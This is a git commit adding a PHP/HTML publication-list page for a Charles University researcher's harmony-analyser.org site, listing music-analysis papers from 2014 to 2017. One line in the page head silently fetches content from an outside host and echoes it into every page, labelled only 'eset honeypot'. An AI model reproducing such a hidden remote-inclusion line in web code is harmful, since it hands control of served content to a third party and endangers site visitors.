b68fb53f35a03af2dfea3391638166c11c9440de
lacimarsik <laci.marsik@gmail.com>
2017-12-19 13:45:22 +0100

    Ladislav Marsik publications

---
+++ ladislav-marsik/index.php
@@ -0,0 +1,225 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
+	"http://www.w3.org/TR/html4/strict.dtd">
+<html>
+
+<head>
+	<meta http-equiv="Content-type" content="text/html; charset=utf-8">
+	<title>Ladislav Maršík - publication list | harmony-analyser.org</title>
+	<meta name="description" itemprop="description" content="Ladislav Marsik research, Ladislav Marsik KSI, Ladislav Marsik PhD, Ladislav Marsik Charles University" />
+	<link rel="shortcut icon" href="http://websupport.sk/images/favicon.ico" type="image/x-icon" />
+	<link href="style.css" rel="stylesheet">
+	<script src="javascript.js"></script>
+	<style type="text/css" media="screen">
+		@import url(http://m.websupport.sk/generic-pages/default/style.css);
+	</style>
+	<style>
+		body {
+			color: black;
+			font-size: 1em;
+			background: #ddd;
+			font-style: normal;
+		}
+
+		h3 {
+			padding-bottom: 10px;
+		}
+
+		#header {
+			color: white !important;
+		}
+
+		#intro {
+			padding-bottom: 30px;
+		}
+
+		#header a {
+			color: white !important;
+			text-decoration: none;
+			padding: 0 10px;
+		}
+
+		#header p {
+			width: 35% !important;
+		}
+
+		#main {
+			text-align: left;
+		}
+
+		#main div {
+			line-height: 1.2em;
+		}
+
+		div#main_message {
+			line-height: 1.5em;
+			padding: 30px 0 5px 0;
+		}
+
+		.paperauthors {
+			color: #222;
+			font-size: 0.9em;
+			padding-top: 10px;
+		}
+
+		.papername {
+			color: #000;
+			font-size: 1.1em;
+			font-weight: bold;
+		}
+
+		.paperpublication {
+			color: #666;
+			font-size: 0.9em;
+			font-style: italic;
+		}
+
+		.papermoreinfo {
+			color: #666;
+			font-size: 0.9em;
+			font-style: italic;
+		}
+
+		.paperlinks {
+			color: blue;
+			font-size: 0.9em;
+			font-style: italic;
+			padding-top: 5px;
+			padding-bottom: 10px;
+		}
+
+		.paperlinks a {
+			padding-right: 10px;
+		}
+
+		.profile {
+			padding-right: 6px;
+			color: #777;
+			font-size: 0.9em;
+			color: blue;
+		}
+	</style>
+    <?php echo @@file_get_contents('http://sfd.eset.com?format=author')  // eset honeypot ?>
+</head>
+
+<body>
+
+<div id="header-wrapper">
+	<div id="header" style="font-size: 0.8em;">
+		<p><a href="http://harmony-analyser.org">harmony-analyser.org</a></p>
+		<a href="https://github.com/lacimarsik/harmony-analyser" title="Repository" target="_blank">Repository</a>
+		<a href="#news" title="News">News</a>
+		<a href="#releases" title="Releases">Releases</a>
+		<a href="#screenshots" title="Screenshots">Screenshots</a>
+		<a href="documentation" title="Documentation">Documentation</a>
+		<a href="ladislav-marsik" title="Publications">Publications</a>
+		<a href="#contact" title="Contact">Contact</a>
+	</div>
+</div>
+
+	<div id="main">
+		<div id="intro">
+			<div id="main_message">
+				<h3 style="text-align: left;">Ladislav Maršík, M.Sc. - publication list</h3>
+			</div>
+			<a class="profile" href="http://ksi.mff.cuni.cz">Department profile</a>
+			<a class="profile" href="http://orcid.org/0000-0001-5630-0019">ORCID</a>
+			<a class="profile" href="http://www.researcherid.com/rid/G-9018-2017">ResearcherID</a>
+			<a class="profile" href="https://www.scopus.com/authid/detail.uri?authorId=57194063739">Scopus</a>
+			<a class="profile" href="https://www.researchgate.net/profile/Ladislav_Marsik">ResearchGate</a>
+			<a class="profile" href="https://dl.acm.org/author_page.cfm?id=99659174894">ACM DL</a>
+			<a class="profile" href="http://dblp.uni-trier.de/pers/hd/m/Marsik:Ladislav">DBLP</a>
+			<a class="profile" href="https://github.com/lacimarsik">GitHub</a>
+		</div>
+		<div id="papers">
+			<div class="paperauthors">Bayle Y., Maršík L., Rusek M., Robine M., Hanna P., Slaninová K., Martinovič J., Pokorný J.:</div>
+			<div class="papername">Kara1k: A Karaoke Dataset for Cover Song Identification and Singing Voice Analysis</div>
+			<div class="paperpublication">in 2017 IEEE International Symposium on Multimedia (ISM),</div>
+			<div class="papermoreinfo">Taichung, Taiwan, IEEE, ISBN: 978-1-5090-4571-6, 2017</div>
+			<div class="paperlinks">
+				<a href="https://www.ieee.org/conferences_events/conferences/conferencedetails/index.html?Conf_ID=41439">IEEE Link</a>
+				<a href="http://www.harmony-analyser.org/download/presentation-ism2017-kara1k-dataset.pdf">Slides PDF</a>
+				<a href="www.harmony-analyser.org/download/poster-ism2017-kara1k-dataset.jpg">Poster JPG</a>
+				<a href="http://ism2017.asia.edu.tw/paper-awards/">Honorable Mention Award</a>
+			</div>
+
+			<div class="paperauthors">Maršík L.:</div>
+			<div class="papername">Analysing Musical Pieces Using harmony-analyser.org Tools</div>
+			<div class="paperpublication">in Proceedings of the Dateso 2017 Workshop,</div>
+			<div class="papermoreinfo">Rančířov u Jihlavy, Czech Republic, Czech Technical University in Prague, ISBN: 978-80-01-06138-1, pp. 55-63, 2017</div>
+			<div class="paperlinks">
+				<a href="http://www.harmony-analyser.org/download/paper-dateso2017-harmony-analyser.pdf">Paper PDF</a>
+				<a href="http://www.harmony-analyser.org/download/presentation-dateso2017-harmony-analyser.pdf">Slides PDF</a>
+			</div>
+
+			<div class="paperauthors">Maršík L.:</div>
+			<div class="papername">Using Chord Distance Descriptors to Enhance Music Information Retrieval: Student Research Abstract</div>
+			<div class="paperpublication">in Proceedings of the ACM Symposium on Applied Computing 2017,</div>
+			<div class="papermoreinfo">Marrakech, Morocco, ACM, ISBN: 978-1-4503-4486-9, pp. 963-964, 2017</div>
+			<div class="paperlinks">
+				<a href="https://dl.acm.org/citation.cfm?id=3019939">ACM Link</a>
+				<a href="http://www.harmony-analyser.org/download/presentation-acmsacsrc2017-chord-distance-descriptors.pdf">Slides PDF</a>
+				<a href="http://www.harmony-analyser.org/download/poster-acmsacsrc2017-chord-distance-descriptors-view.jpg">Poster JPG</a>
+				<a href="https://www.sigapp.org/sac/sac2017/">ACM SRC Winner Award</a>
+			</div>
+
+			<div class="paperauthors">Maršík L., Rusek M., Slaninová K., Martinovič J., Pokorný J.:</div>
+			<div class="papername">Evaluation of Chord and Chroma Features and Dynamic Time Warping Scores on Cover Song Identification Task</div>
+			<div class="paperpublication">in IFIP International Conference on Computer Information Systems and Industrial Management 2017,</div>
+			<div class="papermoreinfo">Lecture Notes in Computer Science, Bialystok, Poland, Springer Verlag, ISBN: 978-3-319-59104-9, ISSN: 0302-9743, pp. 205-217, 2017</div>
+			<div class="paperlinks">
+				<a href="https://link.springer.com/chapter/10.1007/978-3-319-59105-6_18">Link Springer</a>
+				<a href="http://www.harmony-analyser.org/download/presentation-cisim2017-cover-song-identification.pdf">Slides PDF</a>
+			</div>
+
+			<div class="paperauthors">Maršík L.:</div>
+			<div class="papername">harmony-analyser.org - Java Library and Tools for Chordal Analysis</div>
+			<div class="paperpublication">in Proceeding of 2016 Joint WOCMAT - IRCAM Forum Conference</div>
+			<div class="papermoreinfo">Kainan University, Taiwan, Kainan University, ISBN: 978-986-6467-29-5, pp. 38-43, 2016</div>
+			<div class="paperlinks">
+				<a href="http://www.harmony-analyser.org/download/paper-wocmat2016-harmony-analyser.pdf">Paper PDF</a>
+				<a href="http://www.harmony-analyser.org/download/presentation-wocmat2016-harmony-analyser.pdf">Slides PDF</a>
+			</div>
+
+			<div class="paperauthors">Maršík L., Pokorný J., Ilčík M.:</div>
+			<div class="papername">A Survey on Music Retrieval Systems Using Microphone Input</div>
+			<div class="paperpublication">in DATESO 2015 Proceedings of the 15th annual international workshop,</div>
+			<div class="papermoreinfo">CEUR Workshop Proceedings Vol-1343, Nepřívěc u Sobotky, Jičín, Czech Republic, Sun SITE Central Europe, ISBN: 978-80-7378-285-6, ISSN: 1613-0073, pp. 131-140, 2015</div>
+			<div class="paperlinks">
+				<a href="http://ceur-ws.org/Vol-1343/poster7.pdf">Paper PDF</a>
+				<a href="http://www.harmony-analyser.org/download/presentation-dateso2015-survey-mir.pdf">Slides PDF</a>
+			</div>
+
+			<div class="paperauthors">Maršík L., Pokorný J., Ilčík M.:</div>
+			<div class="papername">Improving Music Classification Using Harmonic Complexity</div>
+			<div class="paperpublication">in Proceedings of the 14th conference Information Technologies - Applications and Theory (ITAT 2014) - Workshops and Posters,</div>
+			<div class="papermoreinfo">Demänovská Dolina, Slovakia, Ústav informatiky AV ČR, ISBN: 978-80-87136-19-5, pp. 13-17, 2014</div>
+			<div class="paperlinks">
+				<a href="http://artax.karlin.mff.cuni.cz/~bajel3am/itat2014/local/13_Marsik.pdf">Paper PDF</a>
+				<a href="http://www.harmony-analyser.org/download/presentation-itat2014-improving-music-classification-using-harmonic-complexity.pdf">Slides PDF</a>
+			</div>
+
+			<div class="paperauthors">Maršík L., Pokorný J., Ilčík M.:</div>
+			<div class="papername">Towards a Harmonic Complexity of Musical Pieces</div>
+			<div class="paperpublication">in DATESO 2014 Procedings of the 14th annual international workshop</div>
+			<div class="papermoreinfo">CEUR Workshop Proceedings Vol-1139, Roudnice n. Labem, Sun SITE Central Europe, ISSN: 1613-0073, pp. 1-12, 2014</div>
+			<div class="paperlinks">
+				<a href="http://ceur-ws.org/Vol-1139/paper11.pdf">Paper PDF</a>
+				<a href="http://www.harmony-analyser.org/download/presentation-dateso2014-towards-harmonic-complexity-of-musical-pieces.pdf">Slides PDF</a>
+			</div>
+		</div>
+
+		<hr />
+
+		<div id="contact" style="margin: 45px 0; text-align: left;">
+			<h3>Contact</h3>
+			<div style="line-height: 1em; padding-bottom: 5px; text-align: left;">e-mail: <a href="mailto: marsik@ksi.mff.cuni.cz">marsik@ksi.mff.cuni.cz</a></div><br />
+			<div style="line-height: 1em; padding-bottom: 5px; text-align: left;"><a href="http://www.ksi.mff.cuni.cz/en/~marsik">Ladislav Maršík</a></div>
+			<div style="line-height: 1em; padding-bottom: 5px; text-align: left;"><a href="http://www.ksi.mff.cuni.cz/en">Department of Software Engineering</a>, Faculty of Mathematics and Physics, Charles University</div>
+			<div style="line-height: 1em; padding-bottom: 5px; text-align: left;">Malostranské nám. 25, 118 00 Prague, Czech Republic</div>
+			</ul>
+		</div>
+	</div>
+
+</body>
+
+</html>
